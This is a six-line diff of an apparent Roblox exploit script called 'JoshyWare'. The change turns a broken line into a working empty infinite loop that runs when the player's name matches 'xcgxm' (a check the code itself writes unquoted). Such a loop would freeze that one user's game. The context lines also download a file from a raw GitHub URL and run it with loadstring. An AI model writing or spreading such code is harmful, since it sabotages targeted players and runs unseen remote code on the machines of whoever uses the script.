@@ -1,6 +1,6 @@
 local lp = game.Players.LocalPlayer.Name
 if lp == xcgxm then 
-while to do
+while true do
 end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JoshIsMadAtAmazon/JoshyWare/main/ExecutionLogs",true))()
 if game.PlaceId == 7009799230 then
